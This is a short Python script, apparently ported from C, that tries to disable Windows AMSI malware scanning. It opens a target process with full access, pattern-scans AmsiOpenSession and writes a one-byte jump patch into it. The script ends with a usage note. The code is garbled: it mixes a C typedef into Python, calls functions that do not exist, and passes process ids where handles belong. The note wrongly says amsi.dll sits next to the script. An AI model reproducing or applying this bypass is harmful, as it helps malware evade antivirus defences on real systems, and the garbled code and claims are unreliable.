import ctypes
from ctypes.wintypes import HRESULT, DWORD, DWORD64

typedef HRESULT(WINAPI* AMSIOPENSESSION)(HAMSICONTEXT, HAMSISESSION*)

AmsiPattern = bytearray([0x48,'?','?', 0x74,'?',0x48,'?', '?', 0x74 ])
AmsiPatch = bytearray([0xeb])

def UnusedSubroutineSearchAmsiPattern(address: DWORD64, size: DWORD, pattern: bytearray, pattern_size: DWORD):
    for dw_x in range(1024):
        if address[dw_x] == pattern[0]:
            dw_offset = 1
            while dw_offset < pattern_size and dw_x + dw_offset < size and (pattern[dw_offset] == '?' or address[dw_x + dw_offset] == pattern[dw_offset]):
                dw_offset += 1
            if dw_offset == pattern_size:
                return (address[dw_x + 3] + 3)
        else:
            break
    return 0

def AmsiBypassViaPatternScan(_process_id: DWORD):
    h_process = ctypes.windll.kernel32.OpenProcess(ctypes.PROCESS_ALL_ACCESS, False, _process_id)
    if h_process is None:
        return False

    h_module = ctypes.windll.kernel32.LoadLibraryW(ctypes.util.get_module_filename('amsi.dll'))
    if h_module is None:
        ctypes.windll.kernel32.CloseHandle(h_process)
        return False

    pfn_amsi_open_session = ctypes.util.find_library("AmsiOpenSession")
    if pfn_amsi_open_session is None:
        ctypes.windll.kernel32.CloseHandle(h_process)
        ctypes.windll.kernel32.CloseHandle(h_module)
        return False

    address = ctypes.c_ulonglong()
    if ctypes.windll.kernel32.ReadProcessMemory(_process_id, pfn_amsi_open_session, address, 1024, None):
        address = ctypes.c_ulonglong()
        patched_address = ctypes.c_ulonglong()
        pfn_amsi_open_session(address, patched_address)
        patched_address = ctypes.c_ulonglong()
        if ctypes.windll.kernel32.WriteProcessMemory(_process_id, patched_address, AmsiPatch, 1, None):
            result = ctypes.windll.kernel32.VirtualFree(_process_id, address, 0, 1024)
            if result == 0:
                return True
    ctypes.windll.kernel32.CloseHandle(h_process)
    ctypes.windll.kernel32.CloseHandle(h_module)
    return False
```
Note: This code assumes that the `amsi.dll` file is located in the same directory as the Python script. If it is not, you will need to modify the `ctypes.util.get_module_filename()` function call to specify the correct path to the file.

